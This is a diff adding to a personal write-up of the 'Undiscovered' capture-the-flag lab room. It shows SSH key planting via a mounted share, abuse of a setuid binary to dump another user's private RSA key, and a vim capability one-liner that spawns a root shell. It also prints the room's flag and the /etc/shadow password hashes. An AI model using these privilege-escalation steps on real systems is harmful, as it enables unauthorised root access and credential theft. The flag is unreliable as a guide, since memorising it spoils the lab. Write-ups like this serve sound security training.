@@ -1,6 +1,9 @@
 <p>June 24, 2025</p>
 <h1>Undiscovered</h1>
 
+![image](https://github.com/user-attachments/assets/db23cc4e-40b9-4212-a0a5-a3d67b214870)
+
+
 <h2>rustscan</h2>
 
 ```bash
@@ -240,7 +243,165 @@ The key's randomart image is:
 |o. ==o  ooo.     |
 +----[SHA256]-----+
 william@ip-10-10-253-139:/root/mnt$ cat ./william.pub > .ssh/authorized_keys
-william@ip-10-10-253-139:/root/mnt$ 
+william@ip-10-10-253-139:/root/mnt$ chmod 600 william
+william@ip-10-10-253-139:/root/mnt$ ssh -i william william@10.10.144.57
+...
+william@undiscovered:~$ ls -la
+total 56
+drwxr-x--- 5 william william 4096 Jun 25 11:11 .
+drwxr-xr-x 4 root    root    4096 Sep  4  2020 ..
+-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
+-rw------- 1 root    root       0 Sep  9  2020 .bash_history
+-rw-r--r-- 1 william william 3771 Sep  4  2020 .bashrc
+drwx------ 2 william william 4096 Sep  4  2020 .cache
+drwxrwxr-x 2 william william 4096 Sep  4  2020 .nano
+-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
+-rwsrwsr-x 1 leonard leonard 8776 Sep  4  2020 script
+drwxrwxr-x 2 william william 4096 Jun 25 11:11 .ssh
+-rw-r----- 1 root    william   38 Sep 10  2020 user.txt
+-rw------- 1 william william 2610 Jun 25 11:10 william
+-rw-r--r-- 1 william william  578 Jun 25 11:10 william.pub
+william@undiscovered:~$ cat admin.sh
+#!/bin/sh
 
-
+    echo "[i] Start Admin Area!"
+    echo "[i] Make sure to keep this script safe from anyone else!"
+    
+    exit 0
+william@undiscovered:~$ file script
+script: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6e324a50ee883a60b395cdd1c6a64f96e6546736, not stripped
+william@undiscovered:~$ ./script
+[i] Start Admin Area!
+[i] Make sure to keep this script safe from anyone else!
+william@undiscovered:~$ ./script testing
+/bin/cat: /home/leonard/testing: No such file or directory
+william@undiscovered:~$ ./script .ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
+HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
+YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
+SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
+hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
++ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
+C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
++1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
+...
+ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
+iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
+zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
+3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
+OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
+jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
+sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
+cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
+bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
+LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
+-----END RSA PRIVATE KEY-----
+william@undiscovered:~$ ./script .ssh/id_rsa > leonard
+william@undiscovered:~$ chmod 600 leonard
+william@undiscovered:~$ ssh -i leonard leonard@undiscovered
+...
+leonard@undiscovered:~$ getcap -r / 2>/dev/null
+/usr/bin/mtr = cap_net_raw+ep
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/vim.basic = cap_setuid+ep
+leonard@undiscovered:~$ 
+leonard@undiscovered:~$ 
 ```
+
+<p>https://gtfobins.github.io/gtfobins/vim/</p>
+
+![image](https://github.com/user-attachments/assets/ceddb11e-9c7d-4527-a8da-ac0e680ee6f1)
+
+```bash
+leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+  _    _           _ _                                     _ 
+ | |  | |         | (_)                                   | |
+ | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
+ | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
+ | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
+  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
+      
+             THM{8d7b7299cccd1796a61915901d0e091c}
+
+# cat /etc/shadow
+root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
+daemon:*:18484:0:99999:7:::
+bin:*:18484:0:99999:7:::
+sys:*:18484:0:99999:7:::
+sync:*:18484:0:99999:7:::
+games:*:18484:0:99999:7:::
+man:*:18484:0:99999:7:::
+lp:*:18484:0:99999:7:::
+mail:*:18484:0:99999:7:::
+news:*:18484:0:99999:7:::
+uucp:*:18484:0:99999:7:::
+proxy:*:18484:0:99999:7:::
+www-data:*:18484:0:99999:7:::
+backup:*:18484:0:99999:7:::
+list:*:18484:0:99999:7:::
+irc:*:18484:0:99999:7:::
+gnats:*:18484:0:99999:7:::
+nobody:*:18484:0:99999:7:::
+systemd-timesync:*:18484:0:99999:7:::
+systemd-network:*:18484:0:99999:7:::
+systemd-resolve:*:18484:0:99999:7:::
+systemd-bus-proxy:*:18484:0:99999:7:::
+syslog:*:18484:0:99999:7:::
+_apt:*:18484:0:99999:7:::
+lxd:*:18508:0:99999:7:::
+messagebus:*:18508:0:99999:7:::
+uuidd:*:18508:0:99999:7:::
+dnsmasq:*:18508:0:99999:7:::
+sshd:*:18508:0:99999:7:::
+mysql:!:18509:0:99999:7:::
+statd:*:18509:0:99999:7:::
+william:$6$Nxvi9UI5$h.yTVQCnXbfZ7BZT1sZnl4NHF074.uYC9o.1t61vSfHTJTdVBrdxib/QKXUlyOUkjk6FqusGuxCSIlJJsFyfY/:18509:0:99999:7:::
+leonard:$6$mOYLO55O$oUzIfZpklQj8M4rumAa5UJWoA1KXBYEsQGAdtJliuJDvSAwweQdGi8bgbz.dDVZ63jUc/UX3/VXRwpCkEI5rQ/:18509:0:99999:7:::
+nfsnobody:!:18510:0:99999:7:::
+```
+
+
+```bash
+$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0
+```
+
+<br>
+
+![image](https://github.com/user-attachments/assets/0ed81828-e59f-46d6-ae43-cba3e37f96c5)
+
+![image](https://github.com/user-attachments/assets/0397b980-95ee-4331-93bc-6c759897d032)
+
+<br>
+
+<div align="center">
+
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| June 25, 2025     | 414      |     191st    |      6ᵗʰ     |     265ᵗʰ   |     6ᵗʰ    |  109,933 |    801    |     63    |
+
+</div>
+
+![image](https://github.com/user-attachments/assets/bbb2d2f9-da04-483e-9756-21ed9559c139)
+
+![image](https://github.com/user-attachments/assets/29d9cbf5-3067-47ca-b7fd-7f578c74d1da)
+
+![image](https://github.com/user-attachments/assets/b47c3732-57b3-436e-bf91-77b4639a3a4d)
+
+![image](https://github.com/user-attachments/assets/53b78873-4028-4174-88a6-1100766c7592)
+
+
+![image](https://github.com/user-attachments/assets/d608258e-c771-4eeb-9d56-bbcf149762fe)
+
+
+
+
